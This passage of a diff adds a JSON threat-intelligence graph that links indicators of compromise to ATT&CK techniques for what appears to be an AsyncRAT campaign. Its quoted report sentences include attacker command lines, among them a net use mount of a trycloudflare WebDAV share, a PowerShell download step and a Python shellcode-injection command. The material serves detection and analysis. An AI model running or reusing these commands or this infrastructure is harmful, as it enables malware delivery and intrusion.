+        "node_id": "IOC_a556d829e448",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "explorer.exe",
+        "sentence_indices": [
+          2,
+          13,
+          42,
+          44,
+          49
+        ],
+        "span_sentences": [
+          "- The attack uses legitimate Python downloads from official sources, establishing a complete Python environment on victim systems to execute sophisticated code injection techniques targeting explorer.exe processes.",
+          "These scripts then install a Python environment, establish persistence via startup folder scripts, and inject code into explorer.exe.",
+          "The target process for injection can be specificed via the -p parameter, but defaults to injecting into the explorer.exe process if no parameter is provided.",
+          "- The binary file new.bin serves as the primary input to ne.py, containing the main binary payload that is decrypted and injected into the target process (default: explorer.exe) via APC injection.",
+          "Both URLs also retrieve a legitimate PDF file from the website ihk[.]de and host the final payload, which performs code injection into explorer.exe using Python, and ultimately loads the AsyncRAT shell."
+        ],
+        "edges": [
+          "EDGE_f8ce0dd09a34"
+        ]
+      },
+      {
+        "node_id": "IOC_ae839dc30bb8",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "svchost.exe",
+        "sentence_indices": [
+          20
+        ],
+        "span_sentences": [
+          "Next, the svchost.exe process initiates the WebClient service to enable interaction with WebDAV servers."
+        ],
+        "edges": [
+          "EDGE_1612a7a15b1d",
+          "EDGE_e02c33d1db18"
+        ]
+      },
+      {
+        "node_id": "IOC_c7d7e885ec36",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "new.bin",
+        "sentence_indices": [
+          32,
+          41,
+          44,
+          45,
+          46
+        ],
+        "span_sentences": [
+          "We observed python.exe being used to perform code injection into explorer.exe via the command python ne.py new.bin -k a.txt.",
+          "This script takes on two parameters that have default values and two required parameters — in this instance, the input (-i) new.bin and the key file (-k) a.txt.",
+          "- The binary file new.bin serves as the primary input to ne.py, containing the main binary payload that is decrypted and injected into the target process (default: explorer.exe) via APC injection.",
+          "When unpacked, these new.bin files were identified to be shellcode files created using Donut, an open-source framework used to generate position-independent shellcode.",
+          "- Folders ab, ow, and vb contain different sets of new.bin, a.txt, and ne.py files, consisting of different sets of backdoor payloads alongside AsyncRAT."
+        ],
+        "edges": [
+          "EDGE_0abbb7368fde"
+        ]
+      },
+      {
+        "node_id": "IOC_c7e40e739a3b",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "as.wsh",
+        "sentence_indices": [
+          18,
+          25
+        ],
+        "span_sentences": [
+          "These URLs point to a Windows Script Host file (as.wsh) located in the DavWWWRoot directory.",
+          "In most of the cases that we investigated, the first file that was downloaded and executed was as.wsh which, in turn, downloads and executes anc.wsf."
+        ],
+        "edges": [
+          "EDGE_3a2f84373dd1",
+          "EDGE_6b9e41313542"
+        ]
+      },
+      {
+        "node_id": "IOC_cd18b75537f5",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "olsm.bat",
+        "sentence_indices": [
+          4,
+          31
+        ],
+        "span_sentences": [
+          "- The malware ensures persistence through multiple vectors including startup folder scripts (ahke.bat, olsm.bat), WebDAV mounting, and legitimate \"living-off-the-land\" techniques using Windows Script Host, PowerShell, and built-in system utilities to evade detection.",
+          "It then establishes persistence by dropping a batch file in the Startup folder; however, this time it downloads the files ahke.bat and olsm.bat."
+        ],
+        "edges": [
+          "EDGE_3575e0f1a1a2"
+        ]
+      },
+      {
+        "node_id": "IOC_cf8cdf485a85",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "sentence_indices": [
+          27
+        ],
+        "span_sentences": [
+          "processFilePath: C:\\Windows\\System32\\cmd.exe\nprocessCmd: C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\vio.bat\" h \"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nobjectCmd: powershell -Command \"iwr 'https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip' -OutFile 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\p.zip'\"\nThe other downloaded batch file (xeno.bat) has near-identical functions to vio.bat."
+        ],
+        "edges": [
+          "EDGE_04ef99d90e9a",
+          "EDGE_c0ffb155a3e0"
+        ]
+      },
+      {
+        "node_id": "IOC_d25ab9a6b70b",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "DavWWWRoot",
+        "sentence_indices": [
+          18
+        ],
+        "span_sentences": [
+          "These URLs point to a Windows Script Host file (as.wsh) located in the DavWWWRoot directory."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "IOC_d7424b1e1436",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "trycloudflare[.]com",
+        "sentence_indices": [
+          17,
+          19,
+          21,
+          36
+        ],
+        "span_sentences": [
+          "The downloaded ZIP file contains the Rechnung-zu-Auftrag-W19248960825.pdf.url Internet Shortcut file, which links to a WebDAV resource hosted on various servers within Cloudflare's free-tier service with URLs containing trycloudflare[.]com in their names.",
+          "The specific URLs used in these shortcut files may vary, but they all employ the trycloudflare[.]com domain to obfuscate their true intent.",
+          "Meanwhile, rundll32.exe executes the DavSetCookie function from davclnt.dll with parameters specifying a WebDAV server (plus-condos-thy-redeem.trycloudflare[.]com) and an SSL connection.",
+          "objectCmd: net use Q: \"\\\\syracuse-seeks-wilson-row.trycloudflare[.]com@SSL\\of\" /persistent:no\nThe Python library was then extracted from the mounted Q drive to C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\SystemCache25."
+        ],
+        "edges": [
+          "EDGE_413a10566f8a",
+          "EDGE_8ec1448c1e16",
+          "EDGE_bdfed18f9ed1"
+        ]
+      },
+      {
+        "node_id": "IOC_dffe5915dd92",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "ahke.bat",
+        "sentence_indices": [
+          4,
+          31
+        ],
+        "span_sentences": [
+          "- The malware ensures persistence through multiple vectors including startup folder scripts (ahke.bat, olsm.bat), WebDAV mounting, and legitimate \"living-off-the-land\" techniques using Windows Script Host, PowerShell, and built-in system utilities to evade detection.",
+          "It then establishes persistence by dropping a batch file in the Startup folder; however, this time it downloads the files ahke.bat and olsm.bat."
+        ],
+        "edges": [
+          "EDGE_ece64d5bd66a"
+        ]
+      },
+      {
+        "node_id": "IOC_e2c1dc2bbfa0",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "a.txt",
+        "sentence_indices": [
+          32,
+          41,
+          43,
+          46
+        ],
+        "span_sentences": [
+          "We observed python.exe being used to perform code injection into explorer.exe via the command python ne.py new.bin -k a.txt.",
+          "This script takes on two parameters that have default values and two required parameters — in this instance, the input (-i) new.bin and the key file (-k) a.txt.",
+          "The a.txt file contains keys used by ne.py to decrypt the obfuscated input binary file new.bin.",
+          "- Folders ab, ow, and vb contain different sets of new.bin, a.txt, and ne.py files, consisting of different sets of backdoor payloads alongside AsyncRAT."
+        ],
+        "edges": [
+          "EDGE_6188e7c53930",
+          "EDGE_ccb69d26b808"
+        ]
+      },
+      {
+        "node_id": "IOC_eceea5a00ad1",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "Rechnung zu Auftrag W19248960825.pdf.zip",
+        "sentence_indices": [
+          15
+        ],
+        "span_sentences": [
+          "The image below shows the presence of Outlook.exe, suggesting that the attack involved directing the user to download a malicious archive file named Rechnung zu Auftrag W19248960825.pdf.zip (translating to “Invoice for Order” in German)."
+        ],
+        "edges": [
+          "EDGE_ba0ac9566e93"
+        ]
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_0097d63541aa",
+      "node_u": "HL_6a0a95cd84d0",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_04ef99d90e9a",
+      "node_u": "IOC_cf8cdf485a85",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_07ed8643100d",
+      "node_u": "HL_973c7ab7d44a",
+      "node_v": "TTP_T1102",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_0abbb7368fde",
+      "node_u": "IOC_c7d7e885ec36",
+      "node_v": "TTP_T1055",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_0f781793f078",
+      "node_u": "IOC_4d91df6aefa1",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_105002f3e531",
+      "node_u": "IOC_4d91df6aefa1",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_1330cf3c1d72",
+      "node_u": "IOC_11c69003e100",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_1612a7a15b1d",
+      "node_u": "IOC_ae839dc30bb8",
+      "node_v": "TTP_T1569",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_1a3ca7c48329",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1102",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1bcf824222e5",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1bd523346af0",
+      "node_u": "IOC_1120f7426016",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_25afff398873",
+      "node_u": "IOC_04c1b2d0ccbf",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_2bc527a5e896",
+      "node_u": "IOC_1e1b68e55755",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3575e0f1a1a2",
+      "node_u": "IOC_cd18b75537f5",
+      "node_v": "TTP_T1547",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3a2f84373dd1",
+      "node_u": "IOC_c7e40e739a3b",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3ab01422dab0",
+      "node_u": "IOC_4f278b2e1cff",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3f5468d8ac7c",
+      "node_u": "IOC_2eabd5a10bef",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_40422d3334f9",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_413a10566f8a",
+      "node_u": "IOC_d7424b1e1436",
+      "node_v": "TTP_T1102",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_48412b2bbc22",
+      "node_u": "HL_548f85d138f6",
+      "node_v": "TTP_T1102",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_4c19d9b1bb52",
+      "node_u": "IOC_17f398714025",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_4f7ab8ae5ceb",
+      "node_u": "HL_eb8915b8d64e",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_562234411600",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1055",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_6188e7c53930",
+      "node_u": "IOC_e2c1dc2bbfa0",
+      "node_v": "TTP_T1027",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_6b9e41313542",
+      "node_u": "IOC_c7e40e739a3b",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_744a5eba4fe2",
+      "node_u": "IOC_5fc841d9a55f",
+      "node_v": "TTP_T1036",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_74a2756eec86",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_7adb15690831",
+      "node_u": "IOC_1e1b68e55755",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_82df7e2b6e6f",
+      "node_u": "IOC_488d49251394",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_8ec1448c1e16",
+      "node_u": "IOC_d7424b1e1436",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_956a657ba8dc",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1547",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_95c6fdf6531e",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1140",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_9b612a613039",
+      "node_u": "IOC_11c69003e100",
+      "node_v": "TTP_T1055",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_9f1fec8e3945",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_a63c539c46dd",
+      "node_u": "IOC_4f278b2e1cff",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_a7fbe2bdf092",
+      "node_u": "IOC_5456579a7fc2",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_b501fc3fdfbb",
+      "node_u": "IOC_9d757866d1e5",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_b56c1dd0af73",
+      "node_u": "IOC_5fc841d9a55f",
+      "node_v": "TTP_T1204",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_b6ff033bc844",
+      "node_u": "IOC_02788cbf0e0a",
+      "node_v": "TTP_T1218",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ba0ac9566e93",
+      "node_u": "IOC_eceea5a00ad1",
+      "node_v": "TTP_T1566",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_bdfed18f9ed1",
+      "node_u": "IOC_d7424b1e1436",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_bea7e07df8f9",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_c0ffb155a3e0",
+      "node_u": "IOC_cf8cdf485a85",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c194b4a41891",
+      "node_u": "HL_eb8915b8d64e",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_c5048fe8088d",
+      "node_u": "IOC_452e90101f57",
+      "node_v": "TTP_T1218",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ccb69d26b808",
+      "node_u": "IOC_e2c1dc2bbfa0",
+      "node_v": "TTP_T1140",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ced084c84501",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_d0181937f7e8",
+      "node_u": "IOC_5456579a7fc2",
+      "node_v": "TTP_T1055",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_e02c33d1db18",
+      "node_u": "IOC_ae839dc30bb8",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_e63de98c7edf",
+      "node_u": "IOC_04c1b2d0ccbf",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ec94a16e0ef2",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_ece64d5bd66a",
+      "node_u": "IOC_dffe5915dd92",
+      "node_v": "TTP_T1547",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_f44ec0ba4995",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1036",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_f8ce0dd09a34",
+      "node_u": "IOC_a556d829e448",
+      "node_v": "TTP_T1055",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_f9586280275b",
+      "node_u": "IOC_9d757866d1e5",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_fa6d1c0da8b5",
+      "node_u": "IOC_9cfa8346a4be",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    }
+  ]
+}
